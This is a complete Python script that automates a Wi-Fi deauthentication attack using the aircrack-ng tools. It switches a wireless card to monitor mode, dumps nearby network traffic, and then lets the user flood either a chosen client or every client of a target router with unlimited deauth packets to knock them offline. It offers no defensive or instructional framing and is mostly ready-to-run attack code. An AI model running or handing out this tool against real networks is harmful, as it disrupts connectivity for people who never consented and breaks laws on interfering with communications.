#!/usr/bin/env python3

import os
import sys
import subprocess
import time

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
END = '\033[0m'

wireless_interface = None
wireless_interface_mon = None
bssid=None
channel=None
def check_root():
    if not os.geteuid() == 0 :
        print(f"{RED}Run it as root{END}")
        sys.exit(1) 

def clear() :
    subprocess.check_call(['clear'])

def revert_managed_mode():
    print(f"{GREEN}Reverting to managed mode...{END}")
    subprocess.check_call(['airmon-ng','stop',wireless_interface_mon])
    time.sleep(1)
    clear()

def interface_name():
    global wireless_interface
    global wireless_interface_mon
    subprocess.check_call(['iwconfig'])
    wireless_interface = input(f"{YELLOW}Enter Your wifi card interface name : {END}").strip()
    clear()    
    print(f"{YELLOW}Entering monitor mode ....{END}")
    time.sleep(1)
    subprocess.check_call(['airmon-ng','start',wireless_interface])
    clear()
    subprocess.check_call(['iwconfig'])
    wireless_interface_mon = input(f"{RED}Enter Your new wifi card interface name : {END}").strip()
    clear()

def wifi_dump():
    print(f"{YELLOW}Dumping the wifi traffic ... !!{END}")
    time.sleep(1)
    clear()
    try :
        
        process = subprocess.Popen(['airodump-ng','-w','dump','--output-format','csv', wireless_interface_mon])

        #works as a delay or simply waits infinity long to get interrupt ctrl + c from user
        while True:
            try:
                # Wait for the process to complete or handle Ctrl + C
                process.wait()
            except KeyboardInterrupt:
                print("\nStopping the Wi-Fi dump...")
                process.terminate()  # Terminate the process
                process.wait()       # Wait for the process to exit
                break
    finally:
        pass



def try_again():
        tryagain=input(f"{RED}Try again ? (y/n):{END}")
        
        if tryagain == 'y':
            start_again()
        else :
            revert_managed_mode()

def start_again():
    wifi_dump()
    specific_dump()
    type_of_attack()



def specific_dump() :
    global bssid,channel
    bssid = input(f"{RED}Enter the BSSID : {END}").strip()
    channel = input(f"{RED}Enter the channel: {END}").strip()
    print(f"{YELLOW}Dumping the target network traffic...{END}")
    time.sleep(1)
    try :
        process = subprocess.Popen(['airodump-ng','--bssid',bssid,'-c',channel,wireless_interface_mon])

        while True:
            try:
              process.wait()
            except KeyboardInterrupt:
                print(f"{RED}Stopping the dump...{END}")
                process.terminate()
                process.wait()
                break
    finally:
        pass



def type_of_attack():
     print(f"{GREEN}Enter the attack type: (1, 2, or 3){END}")
     options = input(f"{GREEN}1. Specify the client and send deauth packets to that client\n{END}"
                    f"{RED}2. Send deauth packets to the whole Wi-Fi (knock all clients off the router)\n{END}"
                    f"{YELLOW}3. Exit\nEnter: {END}")
     try:
        match options:
                case "1":
                    station = input(f"{YELLOW}Enter the client's station address (near the targeted BSSID: {bssid}): {END}").strip()
                    process = subprocess.Popen(['aireplay-ng', wireless_interface_mon, '--deauth', '0', '-a', bssid, '-c', station])
                    process.wait()  # Wait for the process to finish
                case "2":
                    process = subprocess.Popen(['aireplay-ng', wireless_interface_mon, '--deauth', '0', '-a', bssid])
                    process.wait()
                case "3":
                    print(f"{RED}Exiting...{END}")
                    revert_managed_mode()
     except KeyboardInterrupt:
            print(f"{RED}\nStopping the deauthentication...{END}")
            process.terminate()  # Terminate the process
            process.wait()  # Wait for it to terminate
     finally:
            try_again()


check_root()
interface_name()
wifi_dump()
specific_dump()
type_of_attack()